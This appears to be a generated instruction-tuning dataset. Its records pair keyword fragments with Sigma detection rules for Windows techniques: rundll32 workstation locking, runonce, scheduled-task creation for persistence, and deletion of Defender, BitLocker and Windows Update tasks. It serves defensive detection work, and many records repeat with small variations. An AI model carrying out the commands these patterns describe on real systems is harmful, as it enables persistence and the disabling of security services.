{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE \\cmd.exe user32.dll, LockWorkStation", "output": "title: Suspicious Workstation Locking via Rundll32\nid: 3b5b0213-0460-4e3f-8937-3abf98ff7dcc\nstatus: test\ndescription: Detects a suspicious call to the user32.dll function that locks the user workstation\nreferences:\n    - https://app.any.run/tasks/2aef9c63-f944-4763-b3ef-81eee209d128/\nauthor: frack113\ndate: 2022-06-04\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_call_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_call_parent:\n        ParentImage|endswith: '\\cmd.exe'\n    selection_call_cli:\n        CommandLine|contains: 'user32.dll,'\n    selection_function:\n        CommandLine|contains: 'LockWorkStation'\n    condition: all of selection_*\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Scripts or links on the user desktop used to lock the workstation instead of Windows+L or the menu option\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE \\cmd.exe \"user32.dll,\" \"LockWorkStation\"", "output": "title: Suspicious Workstation Locking via Rundll32\nid: 3b5b0213-0460-4e3f-8937-3abf98ff7dcc\nstatus: test\ndescription: Detects a suspicious call to the user32.dll function that locks the user workstation\nreferences:\n    - https://app.any.run/tasks/2aef9c63-f944-4763-b3ef-81eee209d128/\nauthor: frack113\ndate: 2022-06-04\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_call_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_call_parent:\n        ParentImage|endswith: '\\cmd.exe'\n    selection_call_cli:\n        CommandLine|contains: 'user32.dll,'\n    selection_function:\n        CommandLine|contains: 'LockWorkStation'\n    condition: all of selection_*\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Scripts or links on the user desktop used to lock the workstation instead of Windows+L or the menu option\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32 RUNDLL32 \\cmd user32.dll, LockWorkStation", "output": "title: Suspicious Workstation Locking via Rundll32\nid: 3b5b0213-0460-4e3f-8937-3abf98ff7dcc\nstatus: test\ndescription: Detects a suspicious call to the user32.dll function that locks the user workstation\nreferences:\n    - https://app.any.run/tasks/2aef9c63-f944-4763-b3ef-81eee209d128/\nauthor: frack113\ndate: 2022-06-04\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_call_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_call_parent:\n        ParentImage|endswith: '\\cmd.exe'\n    selection_call_cli:\n        CommandLine|contains: 'user32.dll,'\n    selection_function:\n        CommandLine|contains: 'LockWorkStation'\n    condition: all of selection_*\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Scripts or links on the user desktop used to lock the workstation instead of Windows+L or the menu option\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rundll32.exe RUNDLL32.EXE \\cmd.exe user32.dll, LockWorkStation", "output": "title: Suspicious Workstation Locking via Rundll32\nid: 3b5b0213-0460-4e3f-8937-3abf98ff7dcc\nstatus: test\ndescription: Detects a suspicious call to the user32.dll function that locks the user workstation\nreferences:\n    - https://app.any.run/tasks/2aef9c63-f944-4763-b3ef-81eee209d128/\nauthor: frack113\ndate: 2022-06-04\nmodified: 2023-02-09\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_call_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n    selection_call_parent:\n        ParentImage|endswith: '\\cmd.exe'\n    selection_call_cli:\n        CommandLine|contains: 'user32.dll,'\n    selection_function:\n        CommandLine|contains: 'LockWorkStation'\n    condition: all of selection_*\nfields:\n    - Image\n    - ParentImage\nfalsepositives:\n    - Scripts or links on the user desktop used to lock the workstation instead of Windows+L or the menu option\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\runonce.exe /AlternateShellStartup", "output": "title: Run Once Task Execution as Configured in Registry\nid: 198effb6-6c98-4d0c-9ea3-451fa143c45c\nstatus: test\ndescription: This rule detects the execution of Run Once task as configured in the registry\nreferences:\n    - https://twitter.com/pabraeken/status/990717080805789697\n    - https://lolbas-project.github.io/lolbas/Binaries/Runonce/\n    - https://twitter.com/0gtweet/status/1602644163824156672?s=20&t=kuxbUnZPltpvFPZdCrqPXA\nauthor: 'Avneet Singh @v3t0_, oscd.community, Christopher Peacock @SecurePeacock (updated)'\ndate: 2020-10-18\nmodified: 2022-12-13\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\runonce.exe'\n        - Description: 'Run Once Wrapper'\n    selection_cli:\n        - CommandLine|contains: '/AlternateShellStartup'\n        - CommandLine|endswith: '/r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\runonce /AlternateShellStartup", "output": "title: Run Once Task Execution as Configured in Registry\nid: 198effb6-6c98-4d0c-9ea3-451fa143c45c\nstatus: test\ndescription: This rule detects the execution of Run Once task as configured in the registry\nreferences:\n    - https://twitter.com/pabraeken/status/990717080805789697\n    - https://lolbas-project.github.io/lolbas/Binaries/Runonce/\n    - https://twitter.com/0gtweet/status/1602644163824156672?s=20&t=kuxbUnZPltpvFPZdCrqPXA\nauthor: 'Avneet Singh @v3t0_, oscd.community, Christopher Peacock @SecurePeacock (updated)'\ndate: 2020-10-18\nmodified: 2022-12-13\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\runonce.exe'\n        - Description: 'Run Once Wrapper'\n    selection_cli:\n        - CommandLine|contains: '/AlternateShellStartup'\n        - CommandLine|endswith: '/r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\runonce.exe /AlternateShellStartup", "output": "title: Run Once Task Execution as Configured in Registry\nid: 198effb6-6c98-4d0c-9ea3-451fa143c45c\nstatus: test\ndescription: This rule detects the execution of Run Once task as configured in the registry\nreferences:\n    - https://twitter.com/pabraeken/status/990717080805789697\n    - https://lolbas-project.github.io/lolbas/Binaries/Runonce/\n    - https://twitter.com/0gtweet/status/1602644163824156672?s=20&t=kuxbUnZPltpvFPZdCrqPXA\nauthor: 'Avneet Singh @v3t0_, oscd.community, Christopher Peacock @SecurePeacock (updated)'\ndate: 2020-10-18\nmodified: 2022-12-13\ntags:\n    - attack.defense-evasion\n    - attack.t1112\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\runonce.exe'\n        - Description: 'Run Once Wrapper'\n    selection_cli:\n        - CommandLine|contains: '/AlternateShellStartup'\n        - CommandLine|endswith: '/r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe /create", "output": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\schtasks.exe\" /create", "output": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe -create", "output": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks /create", "output": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe /create", "output": "title: Scheduled Task Creation Via Schtasks.EXE\nid: 92626ddd-662c-49e3-ac59-f6535f12d189\nstatus: test\ndescription: Detects the creation of scheduled tasks by user accounts via the \"schtasks\" utility.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-01-16\nmodified: 2024-01-18\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\n    - attack.s0111\n    - car.2013-08-001\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains: ' /create '\n    filter_main_system_user:\n        User|contains: # covers many language settings\n            - 'AUTHORI'\n            - 'AUTORI'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Administrative activity\n    - Software installation\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe /delete /tn \\ /f", "output": "title: Delete Important Scheduled Task\nid: dbc1f800-0fe0-4bc0-9c66-292c2abe3f78\nrelated:\n    - id: 9e3cb244-bdb8-4632-8c90-6079c8f4f16d # TaskScheduler EventLog\n      type: similar\n    - id: 7595ba94-cf3b-4471-aa03-4f6baa9e5fad # Security-Audting Eventlog\n      type: similar\nstatus: test\ndescription: Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/delete'\n            - '/tn'\n        CommandLine|contains:\n            # Add more important tasks\n            - '\\Windows\\BitLocker'\n            - '\\Windows\\ExploitGuard'\n            - '\\Windows\\SystemRestore\\SR'\n            - '\\Windows\\UpdateOrchestrator\\'\n            - '\\Windows\\Windows Defender\\'\n            - '\\Windows\\WindowsBackup\\'\n            - '\\Windows\\WindowsUpdate\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe -delete /tn \\ /f", "output": "title: Delete Important Scheduled Task\nid: dbc1f800-0fe0-4bc0-9c66-292c2abe3f78\nrelated:\n    - id: 9e3cb244-bdb8-4632-8c90-6079c8f4f16d # TaskScheduler EventLog\n      type: similar\n    - id: 7595ba94-cf3b-4471-aa03-4f6baa9e5fad # Security-Audting Eventlog\n      type: similar\nstatus: test\ndescription: Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/delete'\n            - '/tn'\n        CommandLine|contains:\n            # Add more important tasks\n            - '\\Windows\\BitLocker'\n            - '\\Windows\\ExploitGuard'\n            - '\\Windows\\SystemRestore\\SR'\n            - '\\Windows\\UpdateOrchestrator\\'\n            - '\\Windows\\Windows Defender\\'\n            - '\\Windows\\WindowsBackup\\'\n            - '\\Windows\\WindowsUpdate\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks /delete /tn \\ /f", "output": "title: Delete Important Scheduled Task\nid: dbc1f800-0fe0-4bc0-9c66-292c2abe3f78\nrelated:\n    - id: 9e3cb244-bdb8-4632-8c90-6079c8f4f16d # TaskScheduler EventLog\n      type: similar\n    - id: 7595ba94-cf3b-4471-aa03-4f6baa9e5fad # Security-Audting Eventlog\n      type: similar\nstatus: test\ndescription: Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/delete'\n            - '/tn'\n        CommandLine|contains:\n            # Add more important tasks\n            - '\\Windows\\BitLocker'\n            - '\\Windows\\ExploitGuard'\n            - '\\Windows\\SystemRestore\\SR'\n            - '\\Windows\\UpdateOrchestrator\\'\n            - '\\Windows\\Windows Defender\\'\n            - '\\Windows\\WindowsBackup\\'\n            - '\\Windows\\WindowsUpdate\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe /delete /tn \\ /f", "output": "title: Delete Important Scheduled Task\nid: dbc1f800-0fe0-4bc0-9c66-292c2abe3f78\nrelated:\n    - id: 9e3cb244-bdb8-4632-8c90-6079c8f4f16d # TaskScheduler EventLog\n      type: similar\n    - id: 7595ba94-cf3b-4471-aa03-4f6baa9e5fad # Security-Audting Eventlog\n      type: similar\nstatus: test\ndescription: Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.impact\n    - attack.t1489\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\schtasks.exe'\n        CommandLine|contains|all:\n            - '/delete'\n            - '/tn'\n        CommandLine|contains:\n            # Add more important tasks\n            - '\\Windows\\BitLocker'\n            - '\\Windows\\ExploitGuard'\n            - '\\Windows\\SystemRestore\\SR'\n            - '\\Windows\\UpdateOrchestrator\\'\n            - '\\Windows\\Windows Defender\\'\n            - '\\Windows\\WindowsBackup\\'\n            - '\\Windows\\WindowsUpdate\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "schtasks.exe wscript vbscript cscript wmic wmic.exe regsvr32.exe powershell \\AppData\\ once 00:00", "output": "title: Uncommon One Time Only Scheduled Task At 00:00\nid: 970823b7-273b-460a-8afc-3a6811998529\nstatus: test\ndescription: Detects scheduled task creation events that include suspicious actions, and is run once at 00:00\nreferences:\n    - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte\nauthor: pH-T (Nextron Systems)\ndate: 2022-07-15\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'wscript'\n            - 'vbscript'\n            - 'cscript'\n            - 'wmic '\n            - 'wmic.exe'\n            - 'regsvr32.exe'\n            - 'powershell'\n            - '\\AppData\\'\n    selection_time:\n        CommandLine|contains|all:\n            - 'once'\n            - '00:00'\n    condition: all of selection_*\nfalsepositives:\n    - Software installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "schtasks.exe wscript vbscript \"cscript\" \"wmic\" wmic.exe regsvr32.exe powershell \\AppData\\ once 00:00", "output": "title: Uncommon One Time Only Scheduled Task At 00:00\nid: 970823b7-273b-460a-8afc-3a6811998529\nstatus: test\ndescription: Detects scheduled task creation events that include suspicious actions, and is run once at 00:00\nreferences:\n    - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte\nauthor: pH-T (Nextron Systems)\ndate: 2022-07-15\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'wscript'\n            - 'vbscript'\n            - 'cscript'\n            - 'wmic '\n            - 'wmic.exe'\n            - 'regsvr32.exe'\n            - 'powershell'\n            - '\\AppData\\'\n    selection_time:\n        CommandLine|contains|all:\n            - 'once'\n            - '00:00'\n    condition: all of selection_*\nfalsepositives:\n    - Software installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "schtasks wscript vbscript cscript wmic wmic regsvr32 powershell \\AppData\\ once 00:00", "output": "title: Uncommon One Time Only Scheduled Task At 00:00\nid: 970823b7-273b-460a-8afc-3a6811998529\nstatus: test\ndescription: Detects scheduled task creation events that include suspicious actions, and is run once at 00:00\nreferences:\n    - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte\nauthor: pH-T (Nextron Systems)\ndate: 2022-07-15\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'wscript'\n            - 'vbscript'\n            - 'cscript'\n            - 'wmic '\n            - 'wmic.exe'\n            - 'regsvr32.exe'\n            - 'powershell'\n            - '\\AppData\\'\n    selection_time:\n        CommandLine|contains|all:\n            - 'once'\n            - '00:00'\n    condition: all of selection_*\nfalsepositives:\n    - Software installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "schtasks.exe wscript vbscript cscript wmic wmic.exe regsvr32.exe powershell \\AppData\\ once 00:00", "output": "title: Uncommon One Time Only Scheduled Task At 00:00\nid: 970823b7-273b-460a-8afc-3a6811998529\nstatus: test\ndescription: Detects scheduled task creation events that include suspicious actions, and is run once at 00:00\nreferences:\n    - https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte\nauthor: pH-T (Nextron Systems)\ndate: 2022-07-15\nmodified: 2023-02-03\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1053.005\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'wscript'\n            - 'vbscript'\n            - 'cscript'\n            - 'wmic '\n            - 'wmic.exe'\n            - 'regsvr32.exe'\n            - 'powershell'\n            - '\\AppData\\'\n    selection_time:\n        CommandLine|contains|all:\n            - 'once'\n            - '00:00'\n    condition: all of selection_*\nfalsepositives:\n    - Software installation\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe schtasks.exe ONLOGON ONSTART ONCE ONIDLE NT AUT SYSTEM HIGHEST", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe schtasks.exe ONLOGON ONSTART ONCE ONIDLE NT AUT \\\"SYSTEM\\\" \\\"HIGHEST\\\"", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks schtasks ONLOGON ONSTART ONCE ONIDLE NT AUT SYSTEM HIGHEST", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe schtasks.exe ONLOGON ONSTART ONCE ONIDLE NT AUT SYSTEM HIGHEST", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\schtasks.exe schtasks.exe ONLOGON ONSTART ONCE ONIDLE NT AUT SYSTEM HIGHEST", "output": "title: Suspicious Schtasks Schedule Types\nid: 24c8392b-aa3c-46b7-a545-43f71657fe98\nrelated:\n    - id: 7a02e22e-b885-4404-b38b-1ddc7e65258a\n      type: similar\nstatus: test\ndescription: Detects scheduled task creations or modification on a suspicious schedule type\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-change\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create\n    - http://blog.talosintelligence.com/2022/09/lazarus-three-rats.html\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-09\ntags:\n    - attack.execution\n    - attack.t1053.005\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\schtasks.exe'\n        - OriginalFileName: 'schtasks.exe'\n    selection_time:\n        CommandLine|contains:\n            - ' ONLOGON '\n            - ' ONSTART '\n            - ' ONCE '\n            - ' ONIDLE '\n    filter_privs:\n        CommandLine|contains:\n            - 'NT AUT' # This covers the usual NT AUTHORITY\\SYSTEM\n            - ' SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space\n            - 'HIGHEST'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - Legitimate processes that run at logon. Filter according to your environment\nlevel: high"}
